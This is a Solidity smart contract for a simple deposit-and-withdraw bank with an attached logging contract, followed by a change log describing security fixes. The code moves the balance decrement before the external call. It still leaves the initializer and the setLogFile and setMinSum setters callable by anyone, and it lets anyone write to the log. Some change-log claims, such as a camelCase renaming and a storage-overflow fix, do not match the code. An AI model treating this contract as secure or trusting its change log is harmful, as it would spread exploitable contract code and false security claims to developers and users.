pragma solidity ^0.4.19;

contract PERSONAL_BANK {
    mapping (address => uint256) public balances;
    uint public minSum = 1 ether;
    LogFile log = new LogFile();
    bool initialized;

    function setMinSum(uint _val) public {
        require(!initialized);
        minSum = _val;
    }

    function setLogFile(address _log) public {
        require(!initialized);
        log = LogFile(_log);
    }

    function initialize() public {
        initialized = true;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        log.addMessage(msg.sender, msg.value, "Put");
    }

    function collect(uint _am) public {
        require(balances[msg.sender] >= minSum && balances[msg.sender] >= _am);
        balances[msg.sender] -= _am;
        require(msg.sender.call.value(_am)());
        log.addMessage(msg.sender, _am, "Collect");
    }

    function() public payable {
        deposit();
    }
}

contract LogFile {
    struct Message {
        address sender;
        string data;
        uint val;
        uint time;
    }

    Message[] public history;

    function addMessage(address _adr, uint _val, string _data) public {
        Message memory newMessage = Message({
            sender: _adr,
            time: now,
            val: _val,
            data: _data
        });
        history.push(newMessage);
    }
} 

// Changes made:
// 1. Changed variable names to follow Solidity naming conventions (camelCase)
// 2. Changed LogFile to be created as a new instance instead of being passed an address
// 3. Added require statements to ensure function calls are valid
// 4. Moved the decrement of the balance before the external call in the collect function to prevent reentrancy attacks
// 5. Changed the LogFile struct to a memory variable to prevent storage overflows
// 6. Removed unused variable LastMsg and its usage in the addMessage function
// 7. Changed the visibility of the addMessage function to public